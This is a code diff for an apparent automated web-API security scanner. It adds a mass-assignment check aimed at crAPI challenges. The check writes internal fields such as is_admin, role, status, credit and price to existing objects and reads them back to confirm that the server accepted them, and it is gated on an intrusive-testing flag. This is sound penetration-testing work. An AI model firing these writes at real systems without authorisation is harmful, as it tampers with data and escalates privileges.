@@ -3074,6 +3074,113 @@ class AssistSession:
             stamp += 1
         return False
 
+    # Internal object properties a client should not be able to WRITE, as (field, marker).
+    # `conversion_params` is crAPI challenge 10; `status`/`credit` are the free-item and
+    # balance shapes (#8/#9 on an existing order). A distinctive marker so the read-back is
+    # unambiguous.
+    _INTERNAL_OBJECT_FIELDS = (
+        ("conversion_params", "brukalMA265"), ("status", "delivered"),
+        ("credit", 1337001), ("balance", 1337001), ("amount", 1337001),
+        ("price", 1), ("discount", 100), ("is_admin", True), ("role", "admin"),
+        ("verified", True), ("is_verified", True), ("internal", "brukalMA265"),
+        ("video_url", "brukalMA265"), ("comment", "brukalMA265"))
+
+    def confirm_object_mass_assignment(self, url: str, method: str = "PUT",
+                                       extra=None) -> bool:
+        """Mass assignment on an EXISTING object (crAPI #8/#10): write an INTERNAL field to
+        an object we can address, then READ it back — if the field took the value we set and
+        did not carry it before, the client controls a server-internal property. Text-marker
+        differential like `confirm_mass_assignment`, but against an object rather than a
+        signup. Gated on allow_intrusive (it WRITES). Returns True on the first field proved."""
+        import json as _json
+        from .web import WebAction
+        if self.browser is None or not self.allow_intrusive:
+            return False
+
+        def get():
+            try:
+                _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
+            except Exception:
+                return None, ""
+            return (r.status if r else None), ((r.body if r else "") or "")
+
+        def write(payload):
+            try:
+                _d, r = self.browser.run(WebAction(
+                    "request", url=url, method=method, body=_json.dumps(payload),
+                    headers={"Content-Type": "application/json"}))
+            except Exception:
+                return None, ""
+            return (r.status if r else None), ((r.body if r else "") or "")
+
+        bs, bb = get()
+        if not bs or not (200 <= bs < 300):
+            return False
+        for field, marker in self._INTERNAL_OBJECT_FIELDS:
+            marks = (f'"{field}": {_json.dumps(marker)}', f'"{field}":{_json.dumps(marker)}')
+            if any(m in bb for m in marks):
+                continue                      # already that value; cannot prove control
+            ws, _wb = write({**(extra or {}), field: marker})
+            if ws is None or ws >= 500:
+                continue
+            as_, ab = get()
+            if as_ and 200 <= as_ < 300 and any(m in ab for m in marks):
+                self._record_confirmed(
+                    url, "Mass assignment of an internal object property", "high", field,
+                    f"writing {field}={marker!r} to the object made the server report "
+                    f"{field}={marker!r} where it did not before — the client controls a "
+                    f"server-internal property", category="api")
+                return True
+        return False
+
+    def confirm_object_mass_assignment_sinks(self) -> int:
+        """Fire the object-mass-assignment question at the objects we can address — those the
+        ownership ledger recorded as ours (real ids from captured traffic), and confirmed
+        object-shaped routes (orders/videos/products/profile). Bounded, allow_intrusive."""
+        if self.browser is None or not self.allow_intrusive or self.surface is None:
+            return 0
+        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/").rstrip("/")
+        urls, seen = [], set()
+        # Ledger-recorded object URLs (captured, ours) rank first — a real, writable object.
+        for rec in (self.principal_identifiers() or {}).get("self", {}).values() \
+                if hasattr(self, "principal_identifiers") else []:
+            u = rec if isinstance(rec, str) and rec.startswith("http") else ""
+            if u and u not in seen:
+                seen.add(u)
+                urls.append(u)
+        hint = ("order", "video", "product", "profile", "vehicle", "cart", "item",
+                "account", "post", "comment")
+        # An addressable OBJECT to write into, never a create/action verb (`add_vehicle`,
+        # `validate-coupon`): mass assignment needs an instance that already exists.
+        verb = ("add", "create", "new", "update", "edit", "delete", "remove", "validate",
+                "convert", "verify", "resend", "search", "reset", "login", "logout",
+                "signup", "register", "refresh", "change", "upload", "bulk", "return")
+        for route in list(getattr(self.surface, "confirmed_routes", []) or []):
+            if "{" in route or not any(h in route.lower() for h in hint):
+                continue
+            last = route.rstrip("/").rsplit("/", 1)[-1].lower()
+            if any(last.startswith(v) or last == v for v in verb):
+                continue
+            u = route if route.startswith("http") else base + (
+                route if route.startswith("/") else "/" + route)
+            if u not in seen:
+                seen.add(u)
+                urls.append(u)
+        confirmed = 0
+        for u in urls[:8]:
+            if (getattr(self, "_confirm_budget", 1) or 1) <= 0 or self._rate_limited:
+                break
+            if getattr(self, "_confirm_budget", None) is not None:
+                self._confirm_budget -= 1
+            for _m in ("PUT", "POST"):
+                try:
+                    if self.confirm_object_mass_assignment(u, method=_m):
+                        confirmed += 1
+                        break
+                except Exception:
+                    continue
+        return confirmed
+
     def confirm_data_exposure(self, url: str) -> bool:
         """Sensitive data served to an UNAUTHENTICATED caller (OWASP API3 / A01).
 
@@ -8426,6 +8533,16 @@ class AssistSession:
                             confirmed += 1
                     except Exception:
                         pass
+
+                # 7a2) OBJECT MASS ASSIGNMENT — write an internal property to an object we
+                #      can address and read it back (crAPI #8/#10: order status, video
+                #      conversion_params). The registration prover above only covers signup.
+                try:
+                    self._covered("Mass assignment",
+                                  note="internal property written to an existing object")
+                    confirmed += self.confirm_object_mass_assignment_sinks()
+                except Exception:
+                    pass
 
                 # 7b) SSRF SINKS — the harness fires the SSRF question at URL-shaped JSON
                 #     body fields the crawl never surfaced (crAPI's `mechanic_api`), which
